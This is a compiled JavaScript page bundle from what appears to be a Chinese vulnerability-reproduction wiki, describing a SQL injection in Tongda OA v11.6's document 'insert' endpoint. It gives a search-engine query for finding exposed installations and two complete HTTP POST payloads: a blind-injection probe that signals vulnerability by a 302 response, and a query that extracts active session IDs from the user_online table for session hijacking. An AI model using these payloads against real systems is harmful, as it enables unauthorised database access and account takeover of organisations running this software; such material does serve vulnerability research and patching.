(window.webpackJsonp=window.webpackJsonp||[]).push([[272],{1362:function(t,s,a){t.exports=a.p+"assets/img/1628303165911-5ee90d8c-903a-46d7-a373-ab9b04bdb173.8a55104c.png"},1363:function(t,s,a){t.exports=a.p+"assets/img/1628303346227-1737a449-b413-4475-83b3-0190c946fa7c.d88983aa.png"},2224:function(t,s,a){"use strict";a.r(s);var n=a(75),r=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"通达oa-v11-6-insert-sql注入漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-6-insert-sql注入漏洞"}},[t._v("#")]),t._v(" 通达OA v11.6 insert SQL注入漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("通达OA v11.6 insert参数包含SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("通达OA v11.6 ")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('app="TDXK-通达OA" ')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("登陆页面")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1362),alt:"img"}})]),t._v(" "),n("p",[t._v("发送请求包判断漏洞")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("general"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("document"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("recv"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("register"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("insert "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("101.89")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".158")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v(".158")]),t._v("\nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("77")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("www"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("form"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("urlencoded\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\ntitle"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("values")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\'"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exp")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("ascii")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("MOD")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("128")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("710")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =1&_SERVER=")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br")])]),n("p",[t._v("返回302则是存在漏洞，返回500则不存在")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1363),alt:"img"}})]),t._v(" "),n("p",[t._v("确认存在漏洞后，再通过SQL注入获取 SessionID进一步攻击")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("general"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("document"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("recv"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("register"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("insert "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nUser"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Go"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("http"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("client"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("122")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("x"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("www"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("form"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("urlencoded\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\ntitle"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("values")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\'"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("^")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("exp")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("ascii")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SID")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("from"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("user_online"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),t._v("limit"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/**/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("710")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# =1&_SERVER=")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br")])])],1)}),[],!1,null,null,null);s.default=r.exports}}]);